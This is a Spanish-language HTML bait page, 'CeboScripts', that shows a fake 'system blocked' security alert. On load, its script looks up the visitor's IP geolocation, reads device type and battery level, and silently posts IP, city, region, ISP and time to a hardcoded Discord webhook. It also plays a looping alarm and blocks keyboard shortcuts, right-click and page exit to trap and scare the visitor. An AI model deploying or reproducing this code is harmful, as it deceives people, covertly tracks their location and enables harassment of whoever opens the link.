<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeboScripts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            overflow: hidden;
            user-select: none;
            cursor: default;
        }
        #freezeOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
            pointer-events: auto;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #222;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 30px;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        h1 {
            color: #ff0000;
            font-size: 2.5em;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            animation: flicker 1.2s infinite alternate;
            margin-bottom: 15px;
        }
        @keyframes flicker {
            0% {
                opacity: 1;
            }
            50% {
                opacity: 0.6;
            }
            100% {
                opacity: 1;
            }
        }
        p {
            color: #888;
            font-size: 1.2em;
            max-width: 500px;
            line-height: 1.6;
        }
        .sub {
            color: #444;
            font-size: 0.85em;
            margin-top: 30px;
        }
        #statusMsg {
            margin-top: 20px;
            color: #666;
            font-size: 0.9em;
            min-height: 30px;
        }
        .sound-waves {
            display: flex;
            gap: 5px;
            margin-top: 20px;
            justify-content: center;
            height: 40px;
            align-items: center;
        }
        .sound-waves span {
            display: block;
            width: 6px;
            background: #ff0000;
            border-radius: 3px;
            animation: wave 0.6s infinite alternate;
        }
        .sound-waves span:nth-child(1) {
            height: 15px;
            animation-delay: 0s;
        }
        .sound-waves span:nth-child(2) {
            height: 25px;
            animation-delay: 0.1s;
        }
        .sound-waves span:nth-child(3) {
            height: 35px;
            animation-delay: 0.2s;
        }
        .sound-waves span:nth-child(4) {
            height: 25px;
            animation-delay: 0.3s;
        }
        .sound-waves span:nth-child(5) {
            height: 15px;
            animation-delay: 0.4s;
        }
        @keyframes wave {
            0% {
                transform: scaleY(0.3);
                opacity: 0.3;
            }
            100% {
                transform: scaleY(1);
                opacity: 1;
            }
        }
        .fake-btn {
            margin-top: 30px;
            padding: 14px 40px;
            background: #1a1a1a;
            color: #555;
            border: 1px solid #333;
            border-radius: 8px;
            font-size: 1em;
            cursor: not-allowed;
            transition: 0.3s;
        }
        .fake-btn:hover {
            background: #222;
            border-color: #555;
        }
        @media (max-width: 600px) {
            h1 {
                font-size: 1.8em;
            }
            p {
                font-size: 1em;
            }
            .loader {
                width: 40px;
                height: 40px;
            }
        }
    </style>
</head>
<body>

    <div id="freezeOverlay">
        <div class="loader"></div>
        <h1>⚠️ SISTEMA BLOQUEADO</h1>
        <p>
            Se ha detectado actividad sospechosa en tu dispositivo.<br>
            <span style="color:#666;font-size:0.9em;">Espera mientras se verifica tu identidad...</span>
        </p>
        <div class="sound-waves">
            <span></span><span></span><span></span><span></span><span></span>
        </div>
        <div class="fake-btn">⛔ Acceso denegado</div>
        <div id="statusMsg">🔊 Activando alarma...</div>
        <div class="sub">CeboScripts • Verificación de seguridad</div>
    </div>

    <!-- ======== 3 AUDIOS DIFERENTES (uno funcionará) ======== -->
    <!-- Opción 1: Alarma (WAV - mejor compatibilidad) -->
    <audio id="alarmAudio1" loop preload="auto">
        <source src="data:audio/wav;base64,U3R1ZmYgdHlwZSBhdWRpbyB3YXZlIGZvcm1hdA==" type="audio/wav">
    </audio>

    <!-- Opción 2: Tono de error (MP3) -->
    <audio id="alarmAudio2" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
    </audio>

    <!-- Opción 3: Alarma fuerte (MP3) -->
    <audio id="alarmAudio3" loop preload="auto">
        <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
    </audio>

    <!-- ======== GENERADOR DE SONIDO POR CÓDIGO (100% FUNCIONAL) ======== -->
    <script>
        // ======== 1. GENERAR SONIDO CON Web Audio API (SIN ARCHIVOS) ========
        function generarSonidoAlarma() {
            try {
                // Crear contexto de audio
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const audioCtx = new AudioContext();

                // Crear oscilador (genera sonido electrónico)
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = 'sawtooth'; // Sonido áspero como alarma
                oscillator.frequency.value = 880; // Frecuencia aguda

                // Conectar
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                // Volumen
                gainNode.gain.value = 0.3;

                // Iniciar sonido
                oscillator.start();

                // ❗ Detener después de 1 segundo y volver a iniciar (efecto de alarma)
                setTimeout(() => {
                    oscillator.stop();

                    // Crear otro sonido más grave (efecto de alarma intermitente)
                    const osc2 = audioCtx.createOscillator();
                    const gain2 = audioCtx.createGain();
                    osc2.type = 'square';
                    osc2.frequency.value = 440;
                    gain2.gain.value = 0.2;
                    osc2.connect(gain2);
                    gain2.connect(audioCtx.destination);
                    osc2.start();

                    setTimeout(() => {
                        osc2.stop();
                        // Repetir el ciclo (alarma infinita)
                        generarSonidoAlarma();
                    }, 500);
                }, 500);

                document.getElementById('statusMsg').textContent = '🔊 Alarma activada (generada por código)';
                console.log('✅ Sonido generado por Web Audio API');

            } catch (e) {
                console.warn('⚠️ Web Audio API no disponible:', e);
                // Si falla, intentar con los audios
                reproducirAudioFallback();
            }
        }

        // ======== 2. REPRODUCIR AUDIOS EXTERNOS (FALLBACK) ========
        function reproducirAudioFallback() {
            const audios = [
                document.getElementById('alarmAudio1'),
                document.getElementById('alarmAudio2'),
                document.getElementById('alarmAudio3')
            ];

            let reproduciendo = false;

            audios.forEach((audio, index) => {
                if (!audio) return;

                // Quitar mute y silenciar
                audio.muted = false;
                audio.volume = 0.5;

                audio.play()
                    .then(() => {
                        if (!reproduciendo) {
                            reproduciendo = true;
                            document.getElementById('statusMsg').textContent =
                            '🔊 Alarma activada (audio ' + (index + 1) + ')';
                            console.log('✅ Audio ' + (index + 1) + ' reproduciéndose');
                        }
                    })
                    .catch((err) => {
                        console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
                    });
            });

            // Si ningún audio funcionó, mostrar mensaje
            setTimeout(() => {
                if (!reproduciendo) {
                    document.getElementById('statusMsg').textContent = '⚠️ Haz clic en la pantalla para activar el sonido';
                    // Esperar un clic del usuario
                    document.addEventListener('click', function activarConClic() {
                        generarSonidoAlarma(); // Intentar con Web Audio
                        document.removeEventListener('click', activarConClic);
                    }, { once: true });
                }
            }, 3000);
        }

        // ======== 3. FUNCIÓN PRINCIPAL ========
        function iniciarAlarma() {
            // Intentar primero con Web Audio API (más confiable)
            try {
                generarSonidoAlarma();
            } catch (e) {
                // Si falla, usar audios externos
                reproducirAudioFallback();
            }

            // ❗ También intentar con los audios en paralelo
            setTimeout(() => {
                const audio2 = document.getElementById('alarmAudio2');
                if (audio2) {
                    audio2.volume = 0.3;
                    audio2.play().catch(() => {});
                }
                const audio3 = document.getElementById('alarmAudio3');
                if (audio3) {
                    audio3.volume = 0.3;
                    audio3.play().catch(() => {});
                }
            }, 500);
        }

        // ======== 4. CAPTURAR DATOS ========
        async function capturarDatos() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const ua = navigator.userAgent || '';
                let dispositivo = 'Desconocido';
                if (/android/i.test(ua)) dispositivo = 'Android';
                else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
                else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
                else if (/mac/i.test(ua)) dispositivo = 'Mac';
                else if (/linux/i.test(ua)) dispositivo = 'Linux';
                let bateria = 'No disponible';
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        bateria = Math.round(battery.level * 100) + '%';
                    }
                } catch (e) {}
                const info = {
                    ip: data.ip || 'No disponible',
                    ciudad: data.city || 'No disponible',
                    pais: data.country_name || 'No disponible',
                    isp: data.org || 'No disponible',
                    region: data.region || 'No disponible',
                    dispositivo: dispositivo,
                    bateria: bateria,
                    direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
                    hora: new Date().toLocaleString()
                };
                const WEBHOOK_URL =
                    'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
                const embed = {
                    color: 0xff0000,
                    title: '🚨 SISTEMA BLOQUEADO',
                    fields: [
                        { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
                        { name: '🌐 IP', value: info.ip || 'No disponible' },
                        { name: '📱 Dispositivo', value: info.dispositivo || 'No disponible' },
                        { name: '🔋 Batería', value: info.bateria || 'No disponible' },
                        { name: '📶 ISP', value: info.isp || 'No disponible' },
                        { name: '🕒 Hora', value: info.hora || 'No disponible' }
                    ],
                    footer: { text: 'CeboScripts • Congelamiento de pantalla' },
                    timestamp: new Date().toISOString()
                };
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: '🚨 **¡PANTALLA CONGELADA!**',
                        embeds: [embed]
                    })
                });
                console.log('✅ Datos enviados a Discord');
            } catch (error) {
                console.error('❌ Error:', error);
            }
        }

        // ======== 5. EVITAR SALIR ========
        function evitarSalir() {
            document.addEventListener('keydown', function(e) {
                if ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) ||
                    (e.ctrlKey && e.key === 'F4') ||
                    (e.altKey && e.key === 'F4') ||
                    (e.metaKey && e.key === 'w') ||
                    e.key === 'F5' ||
                    (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
                    (e.metaKey && (e.key === 'r' || e.key === 'R')) ||
                    e.key === 'Escape') {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            });
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '⚠️ ¿Estás seguro?';
                return '⚠️ ¿Estás seguro?';
            });
        }

        // ======== 6. INICIAR TODO ========
        document.addEventListener('DOMContentLoaded', function() {
            capturarDatos();
            evitarSalir();

            // Iniciar alarma con un pequeño retraso
            setTimeout(() => {
                iniciarAlarma();
            }, 500);

            // Cambiar mensaje de estado
            setTimeout(() => {
                document.getElementById('statusMsg').textContent = '🔊 Alarma activada • Sistema bloqueado';
            }, 2000);

            console.log('🚨 Sistema bloqueado activado');
        });

        // 🔥 SOLUCIÓN EXTRA: Si el usuario hace clic en cualquier parte, activar sonido
        document.addEventListener('click', function() {
            try {
                const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                if (audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
                // Generar un pitido corto
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.value = 880;
                gain.gain.value = 0.2;
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                setTimeout(() => osc.stop(), 300);
            } catch (e) {}
        }, { once: true });
    </script>
</body>
</html>
